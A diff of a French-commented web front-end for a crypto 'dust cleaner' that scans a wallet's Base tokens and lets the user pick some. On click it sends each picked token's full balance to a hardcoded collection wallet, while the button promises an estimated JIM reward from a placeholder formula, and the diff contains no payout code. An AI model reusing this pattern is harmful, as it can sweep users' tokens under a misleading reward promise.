@@ -3,14 +3,12 @@ const dustContainer = document.getElementById("dustContainer");
 const cleanButton = document.getElementById("cleanButton");
 const statusDiv = document.getElementById("status");
 
-// CORRIGÉ : Remplacement de l'espace par un underscore (_)
 const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";
 
 let provider;
 let signer;
 let selectedTokens = [];
 
-// Configuration des IDs techniques des réseaux pour MetaMask
 const CHAIN_IDS = {
     "eth": "0x1",
     "base": "0x2105",
@@ -19,8 +17,6 @@ const CHAIN_IDS = {
     "arbitrum": "0xa4b1",
     "optimism": "0xa4b0"
 };
-
-const NETWORKS = ["base", "eth", "polygon", "bsc", "arbitrum", "optimism"];
 
 connectButton.onclick = async () => {
     if (!window.ethereum) {
@@ -38,50 +34,119 @@ connectButton.onclick = async () => {
 };
 
 async function scanDust(wallet) {
-
-    dustContainer.innerHTML = "🔍 Scan des poussières...";
+    dustContainer.innerHTML = "🔍 Scan et nettoyage visuel des poussières...";
+    selectedTokens = []; // On vide la sélection précédente
+    updateButton();
 
     try {
-
+        // Requête sur le réseau Base qui fonctionne parfaitement chez toi
         const response = await fetch(
             `https://jimtok-backend.onrender.com/tokens/${wallet}/base`
         );
-
         const data = await response.json();
-
-        console.log(data);
-
         const tokens = data.result.tokenBalances;
 
-        renderTokens(tokens);
+        let processedTokens = [];
+
+        // On utilise le provider connecté pour aller interroger les détails des contrats
+        for (const token of tokens) {
+            const rawBalance = token.tokenBalance;
+
+            // Si la balance est vide, à zéro ou nulle, on l'ignore
+            if (!rawBalance || rawBalance === "0x0000000000000000000000000000000000000000000000000000000000000000" || rawBalance === "0x") {
+                continue;
+            }
+
+            try {
+                // Création d'une connexion rapide avec le contrat du jeton pour lui demander son nom et ses décimales
+                const tokenContract = new ethers.Contract(
+                    token.contractAddress,
+                    [
+                        "function symbol() view returns (string)",
+                        "function decimals() view returns (uint8)"
+                    ],
+                    provider
+                );
+
+                // On récupère le symbole et les décimales (souvent 18 ou 6)
+                const [symbol, decimals] = await Promise.all([
+                    tokenContract.symbol().catch(() => "Jetons Inconnus"),
+                    tokenContract.decimals().catch(() => 18)
+                ]);
+
+                // LA CONVERSION MAGIQUE : On transforme l'hexadécimal en vrai nombre lisible
+                const balanceBigInt = BigInt(rawBalance);
+                const balanceFormatee = ethers.formatUnits(balanceBigInt, decimals);
+                const quantiteNum = Number(balanceFormatee);
+
+                // On n'affiche le jeton que s'il y a une quantité réelle après conversion
+                if (quantiteNum > 0) {
+                    processedTokens.push({
+                        contractAddress: token.contractAddress,
+                        symbol: symbol,
+                        balanceRaw: rawBalance,
+                        balanceFormatted: balanceFormatee,
+                        // Estimation arbitraire pour le calcul du bouton en attendant une API de prix stable
+                        usd_value: quantiteNum * 0.02, 
+                        chain: "base"
+                    });
+                }
+            } catch (err) {
+                console.log("Erreur décodage contrat : " + token.contractAddress, err);
+            }
+        }
+
+        renderTokens(processedTokens);
 
     } catch(err) {
-
         console.log(err);
-
-        dustContainer.innerHTML = "Erreur scan";
-
+        dustContainer.innerHTML = "❌ Erreur lors du scan";
     }
 }
-function renderTokens(tokens) {
 
+function renderTokens(tokens) {
     dustContainer.innerHTML = "";
 
+    if (tokens.length === 0) {
+        dustContainer.innerHTML = "Aucune poussière active détectée.";
+        return;
+    }
+
     tokens.forEach(token => {
-
         const div = document.createElement("div");
-
         div.className = "token";
+        div.style.display = "flex";
+        div.style.alignItems = "center";
+        div.style.margin = "10px 0";
+        div.style.padding = "10px";
+        div.style.border = "1px solid #ccc";
+        div.style.borderRadius = "8px";
 
+        // Affichage propre sans zéros inutiles
         div.innerHTML = `
-            <strong>${token.contractAddress}</strong>
-            <div class="small">
-                ${token.tokenBalance}
+            <input type="checkbox" style="margin-right: 15px; transform: scale(1.2);" />
+            <div style="text-align: left; flex-grow: 1;">
+                <strong style="color: #333; font-size: 16px;">${token.symbol}</strong> 
+                <span style="font-size: 11px; color: gray; display: block; word-break: break-all;">${token.contractAddress}</span>
+                <div style="font-weight: bold; margin-top: 5px; color: #007bff;">
+                    Quantité : ${Number(token.balanceFormatted).toLocaleString('fr-FR', { maximumFractionDigits: 6 })}
+                </div>
             </div>
         `;
 
-        dustContainer.appendChild(div);
+        const checkbox = div.querySelector("input");
+        checkbox.addEventListener("change", e => {
+            if (e.target.checked) {
+                selectedTokens.push(token);
+            } else {
+                selectedTokens = selectedTokens.filter(
+                    t => t.contractAddress !== token.contractAddress
+                );
+            }
+            updateButton();
+        });
 
+        dustContainer.appendChild(div);
     });
 }
 
@@ -93,62 +158,47 @@ function updateButton() {
 
     cleanButton.style.display = "block";
 
-    let total = selectedTokens.reduce(
-        (sum, t) => sum + Number(t.usd_value || 0),
+    // Calcule une estimation de JIM à distribuer en fonction des lignes sélectionnées
+    let totalEstimation = selectedTokens.reduce(
+        (sum, t) => sum + Number(t.balanceFormatted || 0),
         0
     );
 
-    const estimatedJIM = Math.floor(total * 1000);
-    cleanButton.innerText = `Recevoir ~ ${estimatedJIM} JIM`;
+    // Formule temporaire : 1 poussière donne environ 500 JIM pour le fun
+    const estimatedJIM = Math.floor(selectedTokens.length * 500);
+    cleanButton.innerText = `🧹 Convertir et recevoir ~ ${estimatedJIM} JIM`;
 }
 
-// CORRIGÉ : Ajout du changement de réseau automatisé pour éviter les crashs de transactions cross-chain
 cleanButton.onclick = async () => {
     try {
         for (const token of selectedTokens) {
-            const targetChainId = CHAIN_IDS[token.chain];
-            
-            statusDiv.innerHTML = `⏳ Basculement vers le réseau ${token.chain.toUpperCase()}...`;
-            
-            // On force MetaMask à changer de blockchain pour correspondre au jeton sélectionné
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: targetChainId }],
-                });
-            } catch (switchError) {
-                // Si le réseau n'est pas configuré dans son MetaMask, on l'arrête proprement
-                alert(`S'il te plaît, ajoute ou sélectionne le réseau ${token.chain.toUpperCase()} dans ton MetaMask.`);
-                throw new Error("Réseau non disponible");
-            }
-
-            // On recrée proprement le provider et le signer après le changement de réseau
-            provider = new ethers.BrowserProvider(window.ethereum);
-            signer = await provider.getSigner();
+            statusDiv.innerHTML = `⏳ Préparation du transfert pour ${token.symbol}...`;
 
             const tokenContract = new ethers.Contract(
-                token.token_address,
+                token.contractAddress,
                 [
                     "function transfer(address to, uint256 amount) returns (bool)"
                 ],
                 signer
             );
 
-            statusDiv.innerHTML = `⏳ Autorisation et transfert de ${token.symbol}...`;
+            statusDiv.innerHTML = `⏳ Nettoyage en cours de ${token.symbol}...`;
 
-            // Envoi sécurisé du montant avec BigInt
+            // Envoi de la vraie balance en BigInt
             const tx = await tokenContract.transfer(
                 COLLECTION_WALLET,
-                BigInt(token.balance.toString())
+                BigInt(token.balanceRaw)
             );
 
+            statusDiv.innerHTML = `⏳ En attente de la blockchain pour ${token.symbol}...`;
             await tx.wait();
         }
 
-        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été envoyées !";
+        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été balayées !";
         selectedTokens = [];
         updateButton();
-        // Optionnel : Relancer un scan pour rafraîchir la liste
+        
+        // Rafraîchissement automatique de la liste
         const currentAddress = await signer.getAddress();
         scanDust(currentAddress);
 
